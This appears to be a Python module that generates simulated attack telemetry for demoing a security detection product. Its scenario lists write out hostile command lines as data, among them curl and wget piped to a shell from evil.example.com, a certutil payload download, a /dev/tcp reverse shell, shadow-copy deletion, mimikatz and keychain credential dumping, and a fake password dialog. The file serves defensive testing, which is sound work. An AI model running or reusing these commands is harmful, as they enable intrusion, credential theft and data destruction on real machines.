"""
Demo mode threat simulator.
Generates realistic telemetry that flows through the full detection pipeline:
  sensor telemetry → heuristics → analysis → response → archive → UI
"""

import threading
import time
import random
import platform
from python.core.logger import get_logger

logger = get_logger('demo')

OS = platform.system()

# ── Windows scenarios ────────────────────────────────────────────────────────
WINDOWS_SCENARIOS = [
    {
        'label': 'Ransomware — mass file encryption',
        'delay': (8, 14),
        'telemetry': {
            'source': 'file', 'event': 'mass_file_modification',
            'count': 34, 'severity_hint': 10, 'attack_hint': 'ransomware',
            'file_path': 'C:\\Users\\Public\\Documents\\report_2024.docx',
            'extension': '.docx', 'is_sensitive': True, 'platform': 'Windows',
        },
    },
    {
        'label': 'Ransomware — extension renamed to .locked',
        'delay': (10, 18),
        'telemetry': {
            'source': 'file', 'event': 'ransomware_extension_detected',
            'src': 'C:\\Users\\Public\\Documents\\financials.xlsx',
            'dest': 'C:\\Users\\Public\\Documents\\financials.xlsx.locked',
            'severity_hint': 9, 'attack_hint': 'ransomware',
            'file_path': 'C:\\Users\\Public\\Documents\\financials.xlsx',
            'is_sensitive': True, 'platform': 'Windows',
        },
    },
    {
        'label': 'PowerShell — encoded command execution',
        'delay': (11, 17),
        'telemetry': {
            'source': 'process', 'event': 'powershell_encoded',
            'pid': 7741, 'name': 'powershell.exe',
            'cmdline': [
                'powershell.exe', '-WindowStyle', 'Hidden',
                '-EncodedCommand', 'JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=',
                '-ExecutionPolicy', 'Bypass',
            ],
            'attack_hint': 'backdoor', 'severity_hint': 8,
            'cpu': 12.4, 'memory': 3.1, 'platform': 'Windows',
        },
    },
    {
        'label': 'Ransomware — shadow copy deletion',
        'delay': (14, 22),
        'telemetry': {
            'source': 'process', 'event': 'shadow_copy_deletion',
            'pid': 3310, 'name': 'vssadmin.exe',
            'cmdline': ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
            'attack_hint': 'ransomware', 'severity_hint': 10, 'platform': 'Windows',
        },
    },
    {
        'label': 'LOLBin — certutil downloading payload',
        'delay': (13, 22),
        'telemetry': {
            'source': 'process', 'event': 'lolbin_download',
            'pid': 5530, 'name': 'certutil.exe',
            'cmdline': ['certutil', '-urlcache', '-split', '-f',
                        'http://evil.example.com/payload.exe', 'C:\\Temp\\p.exe'],
            'attack_hint': 'backdoor', 'severity_hint': 8, 'platform': 'Windows',
        },
    },
    {
        'label': 'Credential dumping — mimikatz detected',
        'delay': (16, 24),
        'telemetry': {
            'source': 'process', 'event': 'credential_dump_tool',
            'pid': 9910, 'name': 'mimikatz.exe',
            'cmdline': ['mimikatz.exe', 'sekurlsa::logonpasswords', 'exit'],
            'attack_hint': 'privilege_escalation', 'severity_hint': 10, 'platform': 'Windows',
        },
    },
]

# ── macOS scenarios ──────────────────────────────────────────────────────────
MACOS_SCENARIOS = [
    {
        'label': 'macOS — Gatekeeper bypass via xattr',
        'delay': (10, 16),
        'telemetry': {
            'source': 'process', 'event': 'gatekeeper_bypass',
            'pid': 4421, 'name': 'xattr',
            'cmdline': ['xattr', '-d', 'com.apple.quarantine', '/Applications/Backdoor.app'],
            'attack_hint': 'rootkit', 'severity_hint': 8, 'platform': 'Darwin',
        },
    },
    {
        'label': 'macOS — LaunchAgent persistence dropped',
        'delay': (12, 20),
        'telemetry': {
            'source': 'file', 'event': 'persistence_file_drop',
            'file_path': '/Users/Shared/Library/LaunchAgents/com.malware.plist',
            'attack_hint': 'backdoor', 'severity_hint': 8, 'platform': 'Darwin',
        },
    },
    {
        'label': 'macOS — launchctl loading agent from /tmp',
        'delay': (11, 18),
        'telemetry': {
            'source': 'process', 'event': 'persistence_mechanism',
            'pid': 2201, 'name': 'launchctl',
            'cmdline': ['launchctl', 'load', '/tmp/com.backdoor.plist'],
            'attack_hint': 'backdoor', 'severity_hint': 9, 'platform': 'Darwin',
        },
    },
    {
        'label': 'macOS — Keychain dump via security binary',
        'delay': (14, 22),
        'telemetry': {
            'source': 'process', 'event': 'keychain_access',
            'pid': 6611, 'name': 'security',
            'cmdline': ['security', 'dump-keychain', '-d'],
            'attack_hint': 'keylogger', 'severity_hint': 9, 'platform': 'Darwin',
        },
    },
    {
        'label': 'macOS — curl piped to bash (download-execute)',
        'delay': (9, 15),
        'telemetry': {
            'source': 'process', 'event': 'download_execute',
            'pid': 5512, 'name': 'curl',
            'cmdline': ['curl', '-fsSL', 'http://evil.example.com/stage2.sh', '|', 'bash'],
            'attack_hint': 'backdoor', 'severity_hint': 9, 'platform': 'Darwin',
        },
    },
    {
        'label': 'macOS — osascript UI spoofing',
        'delay': (13, 21),
        'telemetry': {
            'source': 'process', 'event': 'applescript_execution',
            'pid': 3308, 'name': 'osascript',
            'cmdline': ['osascript', '-e',
                        'display dialog "Enter your password:" with hidden answer'],
            'severity_hint': 6, 'platform': 'Darwin',
        },
    },
]

# ── Linux scenarios ──────────────────────────────────────────────────────────
LINUX_SCENARIOS = [
    {
        'label': 'Linux — bash reverse shell via /dev/tcp',
        'delay': (9, 15),
        'telemetry': {
            'source': 'process', 'event': 'reverse_shell',
            'pid': 1882, 'name': 'bash',
            'cmdline': ['bash', '-i', '>&', '/dev/tcp/10.0.0.1/4444', '0>&1'],
            'attack_hint': 'c2_beacon', 'severity_hint': 10, 'platform': 'Linux',
        },
    },
    {
        'label': 'Linux — LD_PRELOAD injection',
        'delay': (13, 20),
        'telemetry': {
            'source': 'process', 'event': 'ld_preload_injection',
            'pid': 3391, 'name': 'sshd',
            'cmdline': ['sshd'],
            'attack_hint': 'rootkit', 'severity_hint': 10, 'platform': 'Linux',
        },
    },
    {
        'label': 'Linux — rootkit kernel module load',
        'delay': (15, 24),
        'telemetry': {
            'source': 'process', 'event': 'kernel_module_load',
            'pid': 1001, 'name': 'insmod',
            'cmdline': ['insmod', '/tmp/rootkit.ko'],
            'attack_hint': 'rootkit', 'severity_hint': 9, 'platform': 'Linux',
        },
    },
    {
        'label': 'Linux — cron persistence entry added',
        'delay': (11, 18),
        'telemetry': {
            'source': 'process', 'event': 'cron_modification',
            'pid': 7711, 'name': 'crontab',
            'cmdline': ['crontab', '-e'],
            'attack_hint': 'backdoor', 'severity_hint': 7, 'platform': 'Linux',
        },
    },
    {
        'label': 'Linux — wget piped to shell',
        'delay': (10, 16),
        'telemetry': {
            'source': 'process', 'event': 'download_execute',
            'pid': 2244, 'name': 'wget',
            'cmdline': ['wget', '-qO-', 'http://evil.example.com/install.sh', '|', 'sh'],
            'attack_hint': 'backdoor', 'severity_hint': 9, 'platform': 'Linux',
        },
    },
    {
        'label': 'Linux — systemd service dropped for persistence',
        'delay': (14, 22),
        'telemetry': {
            'source': 'file', 'event': 'persistence_file_drop',
            'file_path': '/etc/systemd/system/malware.service',
            'attack_hint': 'backdoor', 'severity_hint': 8, 'platform': 'Linux',
        },
    },
]

# ── Cross-platform scenarios (always included) ───────────────────────────────
COMMON_SCENARIOS = [
    {
        'label': 'C2 Beacon — repeated connections to suspicious host',
        'delay': (9, 15),
        'telemetry': {
            'source': 'network', 'event': 'beacon_pattern',
            'dest_ip': '185.220.101.47', 'dest_port': 4444,
            'frequency': 14, 'packet_size': 64,
            'severity_hint': 6, 'attack_hint': 'c2_beacon',
            'pid': 4821, 'name': 'python3',
        },
    },
    {
        'label': 'Cryptominer — sustained CPU spike',
        'delay': (15, 25),
        'telemetry': {
            'source': 'process', 'event': 'resource_spike',
            'pid': 9123, 'name': 'xmrig',
            'cpu': 97.2, 'memory': 4.8, 'connections': 3,
            'attack_hint': 'cryptominer', 'severity_hint': 5,
        },
    },
    {
        'label': 'Privilege escalation — token impersonation attempt',
        'delay': (10, 16),
        'telemetry': {
            'source': 'process', 'event': 'high_risk_process',
            'pid': 6612, 'name': 'cmd.exe',
            'cmdline': ['cmd.exe', '/c', 'whoami /priv',
                        '&&', 'net', 'localgroup', 'administrators'],
            'cpu': 0.4, 'memory': 0.2,
        },
    },
    {
        'label': 'Data exfiltration — large outbound transfer',
        'delay': (14, 22),
        'telemetry': {
            'source': 'network', 'event': 'new_connection',
            'dest_ip': '104.21.88.23', 'dest_port': 443,
            'packet_size': 58400, 'pid': 2201, 'name': 'node',
            'attack_hint': 'data_exfil', 'severity_hint': 7,
        },
    },
    {
        'label': 'Rootkit — writable+executable memory region',
        'delay': (16, 26),
        'telemetry': {
            'source': 'memory', 'event': 'wx_memory_region',
            'pid': 1188, 'name': 'svchost.exe',
            'region': 'anonymous', 'severity_hint': 6,
        },
    },
]


def _build_scenarios():
    platform_map = {
        'Windows': WINDOWS_SCENARIOS,
        'Darwin':  MACOS_SCENARIOS,
        'Linux':   LINUX_SCENARIOS,
    }
    return platform_map.get(OS, WINDOWS_SCENARIOS) + COMMON_SCENARIOS


SCENARIOS = _build_scenarios()


class ThreatSimulator:
    def __init__(self, on_telemetry):
        self.on_telemetry = on_telemetry
        self.running = False
        self._threads = []

    def start(self):
        self.running = True
        logger.info(f'Demo mode active — threat simulator started (platform={OS})')

        # Fire first 3 scenarios quickly so the UI fills up immediately
        threading.Thread(target=self._fire_first, daemon=True).start()

        for scenario in SCENARIOS:
            t = threading.Thread(
                target=self._scenario_loop,
                args=(scenario,),
                daemon=True,
            )
            t.start()
            self._threads.append(t)

    def stop(self):
        self.running = False

    def _fire_first(self):
        for i, scenario in enumerate(SCENARIOS[:3]):
            time.sleep(2 + i * 3)
            if self.running:
                self.on_telemetry(dict(scenario['telemetry']))

    def _scenario_loop(self, scenario):
        lo, hi = scenario['delay']
        time.sleep(random.uniform(2, 8))

        while self.running:
            try:
                telemetry = dict(scenario['telemetry'])
                if 'cpu' in telemetry:
                    telemetry['cpu'] = round(telemetry['cpu'] + random.uniform(-5, 5), 1)
                if 'packet_size' in telemetry:
                    telemetry['packet_size'] = int(telemetry['packet_size'] * random.uniform(0.8, 1.2))
                if 'count' in telemetry:
                    telemetry['count'] = telemetry['count'] + random.randint(-4, 8)

                self.on_telemetry(telemetry)
                logger.info(f'[DEMO] fired: {scenario["label"]}')
            except Exception as e:
                logger.error(f'[DEMO] scenario error: {e}')

            time.sleep(random.uniform(lo, hi))
